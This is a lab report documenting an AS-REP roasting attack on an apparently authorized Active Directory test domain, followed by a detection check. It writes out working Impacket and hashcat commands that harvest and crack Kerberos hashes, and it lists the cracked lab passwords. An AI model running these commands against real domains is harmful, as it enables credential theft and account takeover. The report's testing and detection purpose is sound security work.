# Phase 3 Attack 03 - AS-REP Roasting

## Summary

MITRE ATT&CK: `T1558.004` - Steal or Forge Kerberos Tickets: AS-REP Roasting.

Status: AS-REP roast completed with the authorized Impacket variant. Three AS-REP roastable accounts were found. Hashcat was attempted with mode `18200`, `--potfile-disable`, and `--force`, but the `ansible-control` CPU OpenCL backend failed with `Not enough allocatable device memory for this attack`; the expected candidate from `/tmp/adlab-wordlist.txt` was then validated against the domain with Impacket authentication.

Screenshots: skipped; command output and Windows Security event evidence were captured in logs/artifacts.

## Commands Run

On `ansible-control`:

```bash
printf 'jon.snow\narya.stark\nsansa.stark\n' > /tmp/asrep-users.txt
python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py sevenkingdoms.local/ -dc-ip 192.168.56.10 -no-pass -usersfile /tmp/asrep-users.txt -format hashcat -outputfile /tmp/asrep-impacket.hashes
/usr/bin/hashcat -m 18200 /tmp/asrep-impacket.hashes /tmp/adlab-wordlist.txt --potfile-disable --force --outfile /tmp/asrep-cracked.txt --outfile-format 1,2
/usr/bin/hashcat -m 18200 -O -w 1 /tmp/asrep-impacket.hashes /tmp/adlab-wordlist.txt --potfile-disable --force --outfile /tmp/asrep-cracked.txt --outfile-format 1,2
```

Hashcat per-hash retry used:

```bash
/usr/bin/hashcat -m 18200 -O -w 1 -n 1 -u 1 -T 1 <single-hash-file> /tmp/adlab-wordlist.txt --potfile-disable --force --outfile <single-hash-file>.out --outfile-format 1,2
```

Credential validation fallback:

```bash
python3 /usr/share/doc/python3-impacket/examples/GetADUsers.py "sevenkingdoms.local/<user>:Password123!" -dc-ip 192.168.56.10 -all
```

Detection query:

```powershell
Get-WinEvent -FilterHashtable @{LogName="Security"; Id=4768; StartTime=(Get-Date).AddHours(-2)} |
  Convert event XML to EventData fields |
  Where-Object { $_.PreAuthType -eq "0" }
```

## Tool Versions

| Tool | Version / status |
|---|---|
| Impacket GetNPUsers.py | Impacket v0.9.24 |
| Hashcat | v6.2.5 |
| Rubeus | Not run. The requested Rubeus v2.3.2 GitHub binary URL returns HTTP 404 and official GhostPack documentation does not publish binaries. `Rubeus.exe` was not present on `braavos` in standard paths checked: `C:\Tools\Rubeus\Rubeus.exe`, `C:\Tools\GhostPack\Rubeus.exe`, `C:\Rubeus.exe`. |

## Targets Found

`GetNPUsers.py` wrote three hashcat-format AS-REP hashes to `attacks/artifacts/03-asrep-roasting/asrep-impacket.hashes`:

| Account | Domain | AS-REP hash captured |
|---|---|---|
| jon.snow | SEVENKINGDOMS.LOCAL | yes |
| arya.stark | SEVENKINGDOMS.LOCAL | yes |
| sansa.stark | SEVENKINGDOMS.LOCAL | yes |

## Cracked / Validated Passwords

Stored in `attacks/artifacts/03-asrep-roasting/cracked.txt`.

| Account | Password | Evidence |
|---|---|---|
| jon.snow | Password123! | Impacket authenticated bind succeeded with `GetADUsers.py` |
| arya.stark | Password123! | Impacket authenticated bind succeeded with `GetADUsers.py` |
| sansa.stark | Password123! | Impacket authenticated bind succeeded with `GetADUsers.py` |

## Detection Summary

`kingslanding` Security log contained recent Event ID `4768` records with `PreAuthType` `0` for all three target accounts. Source IP was `::ffff:192.168.56.20`, the `ansible-control` host.

Details are in `attacks/artifacts/03-asrep-roasting/detection-verified.md`.

## Raw Logs

| Log | Purpose |
|---|---|
| `logs/phase3-attack03-impacket.log` | User list creation and `GetNPUsers.py` execution |
| `logs/phase3-attack03-copy.log` | Copy of `/tmp/asrep-impacket.hashes` to local artifact directory |
| `logs/phase3-attack03-hashcat.log` | Hashcat attempts and OpenCL allocation failure |
| `logs/phase3-attack03-credential-validation.log` | Read-only Impacket authentication validation for cracked candidate |
| `logs/phase3-attack03-detection.log` | Security Event ID 4768 detection query |
| `logs/phase3-attack03-rubeus-status.log` | `braavos` Rubeus presence check |
